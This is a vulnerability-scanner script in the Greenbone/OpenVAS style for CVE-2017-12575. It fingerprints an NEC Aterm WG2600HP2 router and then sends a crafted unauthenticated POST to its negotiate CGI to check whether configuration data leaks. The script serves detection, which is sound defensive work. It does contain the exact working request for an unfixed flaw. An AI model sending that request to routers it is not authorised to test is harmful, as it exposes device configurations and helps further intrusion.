if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.813880" );
	script_version( "2021-06-03T02:00:18+0000" );
	script_cve_id( "CVE-2017-12575" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-06-03 02:00:18 +0000 (Thu, 03 Jun 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2021-01-26 18:15:00 +0000 (Tue, 26 Jan 2021)" );
	script_tag( name: "creation_date", value: "2018-09-07 18:21:50 +0530 (Fri, 07 Sep 2018)" );
	script_name( "NEC Aterm WG2600HP2 Incorrect Access Control Vulnerability" );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2018/Aug/26" );
	script_tag( name: "summary", value: "The host is installed with NEC Aterm WG2600HP2
  wireless LAN router and is prone to an incorrect access control vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks
  whether it is able to access sensitive information or not." );
	script_tag( name: "insight", value: "The flaw exists due to an incorrect access control for some web service APIs." );
	script_tag( name: "impact", value: "Successful exploitation will allow a remote
  attacker to access configurations. This may aid to launch further attacks." );
	script_tag( name: "affected", value: "NEC Aterm WG2600HP2 wireless LAN router" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
necport = http_get_port( default: 80 );
buf = http_get_cache( item: "/aterm_httpif.cgi", port: necport );
if(IsMatchRegexp( buf, "Copyright.*NEC Platforms" ) && IsMatchRegexp( buf, "<title>.*Aterm</title>" ) && ContainsString( buf, "Server: Aterm(HT)" )){
	data = "REQ_ID=SUPPORT_IF_GET";
	url = "/aterm_httpif.cgi/negotiate";
	req = http_post_put_req( port: necport, url: url, data: data, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
	buf = http_keepalive_send_recv( port: necport, data: req );
	if(IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) && ContainsString( buf, "DEVICE_TYPE=" ) && ContainsString( buf, "SUPPORT_REQ=" ) && ContainsString( buf, "Server: Aterm(HT)" ) && ContainsString( buf, "GET_INTERFACE=" ) && ContainsString( buf, "SET_INTERFACE=" )){
		report = http_report_vuln_url( port: necport, url: url );
		security_message( port: necport, data: report );
		exit( 0 );
	}
	exit( 99 );
}
exit( 0 );

